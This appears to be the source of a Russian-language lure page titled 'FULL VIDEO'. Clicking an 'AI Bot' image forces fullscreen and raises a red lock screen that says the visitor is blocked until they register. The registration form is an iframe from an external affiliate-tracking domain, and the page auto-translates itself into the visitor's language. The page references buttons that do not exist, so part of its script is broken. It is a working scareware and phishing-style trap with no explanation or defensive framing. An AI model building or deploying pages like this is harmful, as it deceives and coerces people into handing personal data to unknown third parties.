<!doctype html>
<html lang="ru">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>FULL VIDEO</title>
<style>
html,body{
  height:100%;
  margin:0;
  font-family:system-ui,Segoe UI,Roboto,Arial,sans-serif;
  -webkit-user-select:none;
  user-select:none;
  overflow:hidden;
  display:flex;
  align-items:center;
  justify-content:center;
  background:#1a1a1a;
}

#aiImage{
  cursor:pointer;
  max-width:80%;
  border-radius:12px;
}

#locker{
  position:fixed;
  inset:0;
  background:linear-gradient(135deg, #0a0a0a 0%, #2a0000 100%);
  color:#ff4444;
  display:none;
  align-items:center;
  justify-content:center;
  z-index:2147483647;
}

.card{
  width:clamp(320px,44vw,760px);
  padding:28px;
  border-radius:12px;
  background:rgba(0,0,0,0.85);
  box-shadow:0 0 40px rgba(255,0,0,0.6);
  text-align:center;
  border:2px solid #ff0000;
}

h1{margin:0 0 12px 0;font-size:24px;color:#ff2222;}
p{margin:0 0 18px 0;opacity:0.9;font-size:16px;color:#ff5555;}

.controls{display:flex;gap:10px;justify-content:center;align-items:center;flex-wrap:wrap}
button{padding:10px 14px;border-radius:8px;border:none;background:#880000;color:#fff;font-weight:600;cursor:pointer;}
.linklike{background:transparent;border:1px solid rgba(255,68,68,0.5);padding:8px 12px;border-radius:8px;cursor:pointer;color:#ff6666;}

.modal-backdrop{
  position:fixed;inset:0;background:rgba(0,0,0,0.8);display:flex;align-items:center;justify-content:center;padding:20px;z-index:2147483648;
  display:none;
}
.modal{
  width:clamp(320px,90vw,1000px);height:clamp(360px,80vh,900px);background:#111;border-radius:12px;overflow:hidden;display:flex;flex-direction:column;
  border:2px solid #ff4444;
}
.modal header{display:flex;align-items:center;justify-content:space-between;padding:10px 14px;background:#220000;color:#ff6666}
.modal iframe{flex:1;border:0;width:100%;height:100%}
.modal footer{padding:10px 14px;background:#220000;display:flex;gap:10px;align-items:center;justify-content:flex-end;color:#ff6666}

@media (orientation:portrait){.card{width:94%;}.modal{height:86vh}}
</style>
</head>
<body>

<img id="aiImage" src="ai_bot.png" alt="AI Bot">

<div id="locker" role="dialog" aria-label="Экран блокировки">
  <div class="card" id="card">
    <h1>Вы заблокированы</h1>
    <p>Чтобы разблокировать — пройдите регистрацию!</p>
    <div class="controls">
      <button id="openReg">Пройти регистрацию</button>
    </div>
  </div>
</div>

<div id="regModal" class="modal-backdrop" aria-hidden="true">
  <div class="modal" role="document" aria-label="Регистрация">
    <header>
      
      
    </header>
    <iframe id="regFrame" src="https://avzqa.imirkii10.com/?utm_source=95373a9daf4cb6a2&s1=48854&s2=209775&click_id=conv" title="Форма регистрации" sandbox="allow-forms allow-scripts allow-same-origin" tabindex="0"></iframe>
    <footer>
      
    </footer>
  </div>
</div>

<!-- Google Translate container (скрыт) -->
<div id="google_translate_element" style="display:none;"></div>

<script>
(function(){
  const aiImage = document.getElementById('aiImage');
  const locker = document.getElementById('locker');
  const openReg = document.getElementById('openReg');
  const regModal = document.getElementById('regModal');
  const regFrame = document.getElementById('regFrame');
  const closeModal = document.getElementById('closeModal');
  const iRegistered = document.getElementById('iRegistered');

  function tryFullscreen(){
    const elem = document.documentElement;
    if(!document.fullscreenElement){
      if(elem.requestFullscreen) elem.requestFullscreen().catch(()=>{});
      else if(elem.webkitRequestFullscreen) elem.webkitRequestFullscreen().catch(()=>{});
    }
  }

  aiImage.addEventListener('click', ()=>{
    locker.style.display='flex';
    tryFullscreen();
    // Авто-перевод при клике
    if(typeof googleTranslateElementInit === "function"){
      googleTranslateElementInit();
    }
  });

  openReg.addEventListener('click', ()=>{
    tryFullscreen();
    regModal.style.display='flex';
    regModal.setAttribute('aria-hidden','false');
    setTimeout(()=>{try{regFrame.focus();}catch(e){}},200);
  });

  closeModal.addEventListener('click', ()=>{ 
    regModal.style.display='none'; 
    regModal.setAttribute('aria-hidden','true'); 
  });

  iRegistered.addEventListener('click', ()=>{ 
    try{ if(document.exitFullscreen) document.exitFullscreen(); else if(document.webkitExitFullscreen) document.webkitExitFullscreen(); }catch(e){}
    locker.remove();
    regModal.style.display='none';
  });
})();
</script>

<!-- Google Translate -->
<script>
function googleTranslateElementInit() {
  new google.translate.TranslateElement({pageLanguage: 'ru', autoDisplay: false}, 'google_translate_element');
  const userLang = navigator.language || navigator.userLanguage;
  const langCode = userLang.split('-')[0];
  const interval = setInterval(() => {
    const select = document.querySelector('.goog-te-combo');
    if(select){
      select.value = langCode;
      select.dispatchEvent(new Event('change'));
      clearInterval(interval);
    }
  }, 500);
}
</script>
<script src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>

</body>
</html>
